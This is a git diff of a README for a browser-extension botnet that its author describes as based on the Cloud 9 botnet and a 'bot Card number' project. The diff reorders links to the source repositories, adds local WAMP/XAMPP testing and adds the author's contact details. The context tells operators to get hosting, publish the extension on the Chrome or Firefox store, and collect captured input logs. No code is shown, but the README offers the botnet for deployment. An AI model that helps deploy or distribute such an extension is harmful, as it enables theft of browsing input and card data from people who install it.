@@ -8,18 +8,10 @@ javascript botnet browser V3 based one Cloud 9 Botnet and my botnet browser chro
 
 ![3](https://user-images.githubusercontent.com/30985149/77988229-b49d4500-7313-11ea-833f-f1bf10c15be5.PNG)
 
-# Original project
-my bot Card number
-https://github.com/hakanonymos/botnet-browser-chrome   
-
-Cloud 9 botnet
-https://github.com/Antonio24/Cloud9
- this project has a probleme, i have fixed some probleme 
-
 
 # what do you need ?
 
-1) hosting (free or not)
+1) hosting (free or not) or test with wampserver ou xhamp
  
 2) Upload your extension one mozilla firefox or chrome web store (if you have a problem contact me )
 
@@ -50,6 +42,21 @@ http://127.0.0.1/bot/logs/127.0.0.1-inputs.txt
 # Demo video Youtube
 
 https://www.youtube.com/watch?v=65ORpeeGWps&feature=youtu.be
+
+#Contatc infos
+
+https://www.instagram.com/hakanonymos
+
+hakanonymos@hotmail.com
+
+# Original project
+my bot Card number
+https://github.com/hakanonymos/botnet-browser-chrome   
+
+Cloud 9 botnet
+https://github.com/Antonio24/Cloud9
+ this project has a probleme, i have fixed some probleme 
+
 
 
 
